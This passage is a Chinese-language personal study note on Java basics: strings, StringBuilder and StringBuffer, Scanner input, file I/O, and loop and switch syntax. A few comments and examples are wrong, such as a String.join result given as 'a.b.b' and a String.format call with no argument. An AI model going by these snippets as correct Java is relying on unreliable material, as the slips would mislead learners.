function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "l"</span></code></pre><p>Java语言允许用<code>+</code>号拼接字符串。</p><p>当一个字符串与一个非字符串的值进行拼接时，后者会转换成字符串。</p><p>把多个字符串放一起，用一个界定符分割，用静态方法join：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> s <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">,</span><span class="token string">"b"</span><span class="token punctuation">,</span><span class="token string">"c"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// a.b.b</span></code></pre><p><strong>String类没有提供修改字符串中某个字符的方法。</strong>可以提取想要保留的字串，再与希望替换的字符拼接。</p><p>由于不能修改Java字符串中的单个字符，所以在Java文档中将String类对象称为是不可变的。</p><p><strong>可以使用equals方法检测两个字符串是否相等</strong>。不区分大小写可以用<code>equalsIgnoreCase</code>。</p><p>不要使用<code>==</code>检测两个字符串是否相等。它只能确定两个字符串是否存放在同一位置上。</p><p>空字符串是长度为0的字符串，检查方式：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>检查一个字符串是否是null：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span><span class="token punctuation">(</span>str<span class="token operator">==</span><span class="token keyword">null</span><span class="token punctuation">)</span></code></pre><p>length方法将返回采用UTF-16编码表示给定字符串所需要的代码单元数量。</p><p>每次拼接字符串的时候，都会构建一个新的String对象，即耗时，又浪费空间。使用StringBuilder类。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">StringBuilder</span> s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"b"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> completedString <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>completedString<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>在使用 StringBuffer 类时，每次都会对 StringBuffer 对象本身进行操作，而不是生成新的对象，所以如果需要对字符串进行修改推荐使用 StringBuffer。</p><p>StringBuilder 类在 Java 5 中被提出，它和 StringBuffer 之间的最大不同在于 StringBuilder 的方法不是线程安全的（不能同步访问）。</p><p>由于 StringBuilder 相较于 StringBuffer 有速度优势，所以多数情况下建议使用 StringBuilder 类。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Study</span> <span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//重写Object类中toString()方法</span><span class="token keyword">return</span> <span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">StringBuffer</span> s1<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span><span class="token string">"abcd1234!?,;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">StringBuffer</span> s2<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span><span class="token string">"987654321987654"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">StringBuffer</span> s3<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span><span class="token string">"987654321"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"↓↓↓StringBuffer类的一些常用方法如下↓↓↓"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"字符串s1的长度为："</span> <span class="token operator">+</span> s1<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//返回字符串的实际长度</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"字符串s1所占容器的大小为："</span> <span class="token operator">+</span> s1<span class="token punctuation">.</span><span class="token function">capacity</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//返回字符串所占容器的总大小</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"获取字符串s1中第2个位置的字符："</span> <span class="token operator">+</span> s1<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"子字符串'654'第一次出现在字符串s2中的索引为："</span> <span class="token operator">+</span> s2<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"654"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"从指定的索引6开始搜索，返回子字符串'654'第一次出现在字符串s2中的索引："</span> <span class="token operator">+</span> s2<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"654"</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"子字符串'987'最后一次出现在字符串s2中的索引为："</span> <span class="token operator">+</span> s2<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">"987"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"从指定的索引5开始反向搜索，返回字符串'87'在字符串s2中最后一次出现的索引："</span> <span class="token operator">+</span> s2<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">"87"</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>s1<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token char">'x'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//在字符串s1的末尾添加字符'c'</span>s1<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"Java"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//在字符串s1的末尾添加字符串"Java"</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"修改后的字符串s1为："</span> <span class="token operator">+</span> s1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>s1<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">"abcd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//在第4个位置插入字符串"abcd"</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"修改后的字符串s1为："</span> <span class="token operator">+</span> s1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>s1<span class="token punctuation">.</span><span class="token function">deleteCharAt</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除字符串s1中第一个位置的字符</span>s1<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除字符串s1中第2到第4个位置的字符</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"修改后的字符串s1为："</span> <span class="token operator">+</span> s1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>s1<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"5678"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将字符串s1中第4到第7个位置的字符串修改为"5678"</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"修改后的字符串s1为："</span> <span class="token operator">+</span> s1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>s1<span class="token punctuation">.</span><span class="token function">setCharAt</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token char">'b'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将字符串s1中第一个位置的字符修改为'b'</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"修改后的字符串s1为："</span> <span class="token operator">+</span> s1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>s2<span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将字符串s2反转</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"修改后的字符串s2为："</span> <span class="token operator">+</span> s2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"截取字符串s1从第4个位置开始到结尾："</span> <span class="token operator">+</span> s1<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"截取字符串s1从第4个位置开始到第7个位置结尾："</span> <span class="token operator">+</span> s1<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"获取s1的变量类型："</span> <span class="token operator">+</span> s1<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"将对象信息转化为字符串："</span> <span class="token operator">+</span> s2<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>读取输入：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Scanner</span> in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> s1 <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">nextLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//读取一行输入</span><span class="token class-name">String</span> s2 <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//读取一个单词，以空白符作为分割。</span><span class="token keyword">int</span> age <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//读取一个整数</span><span class="token keyword">double</span> feng <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">nextDouble</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>feng<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>注意要加上<code>import java.util.*</code>。当使用的类不是定义在基本java.lang包中时，一定要使用import指令导入相应的包。</p><p>格式化输出：</p><p><code>System.out.print(x)</code>将数值x输出到控制台。这条命令将以x的类型所允许的最大非0数位个数打印输出x。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">double</span> x <span class="token operator">=</span> <span class="token number">1000.0</span><span class="token operator">/</span><span class="token number">3.0</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>Java也沿用了C语言的printf，具体使用不说了。</p><p>可以使用静态的String.format方法创建一个格式化的字符串，而不打印输出：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> x <span class="token operator">=</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"hello,%s"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>文件输入与输出：</p><p>要想读取一个文件，需要构造一个Scanner对象：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Scanner</span> in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span><span class="token class-name">Path</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token string">"Java.iml"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">StandardCharsets</span><span class="token punctuation">.</span><span class="token constant">UTF_8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>in<span class="token punctuation">.</span><span class="token function">hasNextLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>in<span class="token punctuation">.</span><span class="token function">nextLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>要想写入文件，就需要构造一个PrintWriter对象：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">PrintWriter</span> out <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PrintWriter</span><span class="token punctuation">(</span><span class="token string">"1.txt"</span><span class="token punctuation">,</span><span class="token class-name">StandardCharsets</span><span class="token punctuation">.</span><span class="token constant">UTF_8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"hello,world"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"hhhhhh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//必须有，不然写不进去</span></code></pre><p>如果文件不存在，则创建该文件。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">PrintWriter</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>charset<span class="token punctuation">.</span></span><span class="token class-name">StandardCharsets</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Path</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Draft</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Scanner</span> in<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span><span class="token class-name">Path</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token string">"D:\\JavaProject\\Draft\\Draft.java"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">StandardCharsets</span><span class="token punctuation">.</span><span class="token constant">UTF_8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">PrintWriter</span> out<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            out <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PrintWriter</span><span class="token punctuation">(</span><span class="token string">"D:\\JavaProject\\Draft\\Draft.txt"</span><span class="token punctuation">,</span> <span class="token class-name">StandardCharsets</span><span class="token punctuation">.</span><span class="token constant">UTF_8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>in<span class="token punctuation">.</span><span class="token function">hasNextLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> line <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">nextLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        in<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>关于路径问题，可以使用下面的调用找到启动目录的位置：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> dir <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"user.dir"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>dir<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>IntelliJ IDEA的启动目录总是和.idea同级而不是当然执行的src里面的那个Main.java。</p><p>Java中，不能在嵌套的两个块中声明同名的变量。</p><p>if语句：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> feng <span class="token operator">=</span> <span class="token number">321</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>feng <span class="token operator">></span> <span class="token number">111</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"yes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>while语句：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> feng <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>feng<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>feng<span class="token punctuation">)</span><span class="token punctuation">;</span>    feng<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>for：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;=</span> <span class="token number">10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><strong>在循环中，检测两个浮点数是否相等需要格外小心</strong>：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">double</span> x <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>x <span class="token operator">!=</span> <span class="token number">10</span><span class="token punctuation">;</span>x<span class="token operator">+=</span><span class="token number">0.1</span><span class="token punctuation">)</span></code></pre><p>永远不会结束，由于舍入的误差，永远达不到精确的最终值。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token punctuation">&#125;</span><span class="token comment">//i no longer defined here</span><span class="token comment">//此外，如果在for语句内部定义一个变量，这个变量就不能在循环体之外使用。</span></code></pre><p>switch：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">switch</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span 